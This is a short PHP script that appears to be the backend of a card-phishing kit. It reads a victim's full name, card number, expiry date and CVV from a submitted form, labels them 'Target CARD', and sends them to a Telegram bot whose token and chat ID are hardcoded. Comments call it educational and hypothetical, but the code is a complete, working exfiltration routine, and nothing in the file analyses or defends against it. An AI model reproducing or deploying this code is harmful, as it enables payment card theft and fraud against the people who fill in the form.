<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Assuming you have a form field for email and password
    $name = filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING);
    $card = filter_input(INPUT_POST, 'card', FILTER_SANITIZE_EMAIL);
    $exp = filter_input(INPUT_POST, 'exp', FILTER_SANITIZE_STRING);
    $csv = filter_input(INPUT_POST, 'csv', FILTER_SANITIZE_STRING);


 

 

    // For educational purposes, here's how you might format a message
    $message = " =========Target CARD============" . 
    "\nFULL NAME : " . $name . 
    "\nCC NUMBER : " . $card . 
    "\nEXPIRATION : " . $exp .
    "\nCVV NUMBR : " . $csv;


    // Sending to a Telegram bot hypothetically
     $telegramBotToken = '6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk';
     $chatId = '1064643518';
     $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents or cURL to send the message
     $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini
   


}
?>
